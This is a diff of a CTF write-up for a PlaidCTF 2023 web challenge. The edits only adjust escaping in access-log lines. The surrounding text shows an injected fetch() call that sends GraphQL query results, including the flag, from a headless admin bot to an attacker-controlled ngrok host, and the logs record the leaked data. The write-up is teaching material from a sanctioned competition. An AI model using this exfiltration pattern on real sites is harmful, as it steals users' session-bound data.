@@ -355,7 +355,7 @@ When someone visit our user profile, it'll send a request to GrahpQL endpoint, w
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/PlaidCTF-2023/images/Pasted%20image%2020230415223944.png)
 
 ```
-client_1    | 172.21.0.1 - - [15/Apr/2023:14:39:23 +0000] "GET /?d=\{%22errors%22:[\{%22message%22:%22Not%20logged%20in%22,%22locations%22:[\{%22line%22:1,%22column%22:12}],%22path%22:[%22flag%22],%22extensions%22:\{%22code%22:%22INTERNAL_SERVER_ERROR%22}}],%22data%22:\{%22flag%22:null}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" "{Redacted}"
+client_1    | 172.21.0.1 - - [15/Apr/2023:14:39:23 +0000] "GET /?d={\%22errors%22:[{\%22message%22:%22Not%20logged%20in%22,%22locations%22:[{\%22line%22:1,%22column%22:12}],%22path%22:[%22flag%22],%22extensions%22:{\%22code%22:%22INTERNAL_SERVER_ERROR%22}}],%22data%22:{\%22flag%22:null}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" "{Redacted}"
 ```
 
 Nice!
@@ -374,7 +374,7 @@ Nice!
 However, it didn't retrieve the flag...
 
 ```
-client_1    | 172.21.0.1 - - [15/Apr/2023:14:43:54 +0000] "GET /?d=\{%22errors%22:[\{%22message%22:%22Not%20logged%20in%22,%22locations%22:[\{%22line%22:1,%22column%22:12}],%22path%22:[%22flag%22],%22extensions%22:\{%22code%22:%22INTERNAL_SERVER_ERROR%22}}],%22data%22:\{%22flag%22:null}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "{Redacted}"
+client_1    | 172.21.0.1 - - [15/Apr/2023:14:43:54 +0000] "GET /?d={\%22errors%22:[{\%22message%22:%22Not%20logged%20in%22,%22locations%22:[{\%22line%22:1,%22column%22:12}],%22path%22:[%22flag%22],%22extensions%22:{\%22code%22:%22INTERNAL_SERVER_ERROR%22}}],%22data%22:{\%22flag%22:null}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "{Redacted}"
 ```
 
 Why it's not logged in?
@@ -451,7 +451,7 @@ fetch('https://987a-{Redacted}.ngrok-free.app/?d=' + text);
 
 **Then send the `report` mutation query:**
 ```
-client_1    | 172.21.0.1 - - [15/Apr/2023:15:03:33 +0000] "GET /?d=\{%22data%22:\{%22flag%22:%22PCTF{fake_flag}%22}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "{Redacted}"
+client_1    | 172.21.0.1 - - [15/Apr/2023:15:03:33 +0000] "GET /?d={\%22data%22:{\%22flag%22:%22PCTF{fake_flag}%22}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "{Redacted}"
 ```
 
 **Armed with above information, we can now work on the remote instance!**
@@ -472,7 +472,7 @@ Some teams wrote a solve script, however, I decided to speed run it! :D
 
 **And you see the following request in Ngrok:**
 ```
-client_1    | 172.21.0.1 - - [15/Apr/2023:15:21:05 +0000] "GET /?d=\{%22data%22:\{%22flag%22:%22PCTF{sorry_about_all_the_networking_problems..._f252ceec1321fd285398809b}}%22}} HTTP/1.1" 200 366 "http://5c6a8576-c1e8-45d6-96f4-690cdfa8afc0.dubs.putlocker.chal.pwni.ng:20004/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "44.201.232.122"
+client_1    | 172.21.0.1 - - [15/Apr/2023:15:21:05 +0000] "GET /?d={\%22data%22:{\%22flag%22:%22PCTF{sorry_about_all_the_networking_problems..._f252ceec1321fd285398809b}}%22}} HTTP/1.1" 200 366 "http://5c6a8576-c1e8-45d6-96f4-690cdfa8afc0.dubs.putlocker.chal.pwni.ng:20004/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "44.201.232.122"
 ```
 
 Bam! We got the flag!
